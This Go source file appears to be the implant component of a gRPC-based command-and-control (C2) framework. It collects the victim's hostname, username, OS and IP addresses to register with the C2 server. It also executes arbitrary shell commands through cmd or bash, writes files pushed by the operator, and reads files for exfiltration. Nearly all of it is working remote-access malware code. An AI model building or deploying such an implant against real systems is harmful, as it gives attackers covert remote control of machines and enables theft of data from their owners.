package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	pb "simpleGRPC/proto_defs/common"
	"strings"

	"github.com/elastic/go-sysinfo"
	"github.com/google/uuid"
)

// #####  Parsing / Handling  ######

func Error_check(c string, e error) {
	if e != nil {
		log.Fatalf("%s : %v", c, e)
	}
}
func Strip(toStrip string) string {
	return strings.TrimSpace(string(bytes.Trim([]byte(toStrip), "\x00")))
}

func cleanIPs(ipList []string) []string {
	tr := make([]string, 0)
	var cleaned string

	for _, ip := range ipList {
		if ip == "" {
			continue
		}

		cleaned = strings.Split(ip, "/")[0]

		if cleaned != "127.0.0.1" && !strings.Contains(cleaned, ":") {
			if net.ParseIP(cleaned) != nil && strings.Contains(cleaned, ".") {
				tr = append(tr, cleaned)
			}
		}
	}

	return tr
}

// #####  Registering with  C2  ######

func GenSessionId() string {
	id := uuid.New()
	session = strings.Split(id.String(), "-")[0]
	return session
}

func RegisterForm() (*pb.AssetRegistration, error) {

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("[-] Failure to get hostname")
		hostname = "failed"
	}

	username, err := user.Current()
	if err != nil {
		fmt.Println("[-] Failure to get username")
		username.Username = "failed"
	}

	host, _ := sysinfo.Host()
	hostInfo := host.Info()

	reg := &pb.AssetRegistration{
		MagicNb:   magic,
		SessionId: GenSessionId(),
		Hostname:  hostname,
		Username:  username.Username,
		OS:        hostInfo.OS.Platform + " " + hostInfo.OS.Version,
		IP:        cleanIPs(hostInfo.IPs),
	}

	return reg, nil

}

// ##### Basic Tasks #####

func RunShellCmd(cmd string) string {

	target_os := runtime.GOOS

	var output []byte
	var err error

	if target_os == "windows" {
		output, err = (exec.Command("cmd", "/c", Strip(cmd))).CombinedOutput()
	} else {
		output, err = (exec.Command("/bin/bash", "-c", Strip(cmd))).CombinedOutput()
	}

	if err != nil {
		return string(string(output) + "\n[!] Golang Error: " + err.Error())
	}
	return string(output)
}

func Upload(path string, data []byte) string {
	if data == nil || len(data) == 0 {
		return "[-] Inexisting or Empty file"
	}

	err := os.WriteFile(path, data, 0644)
	if err != nil {
		return fmt.Sprintf("[-] %v", err)
	}

	return "[+] File Uploaded"
}

func Download(path string) ([]byte, error) {

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("[-] Error downloading file : %v", err)
	}

	return data, nil
}
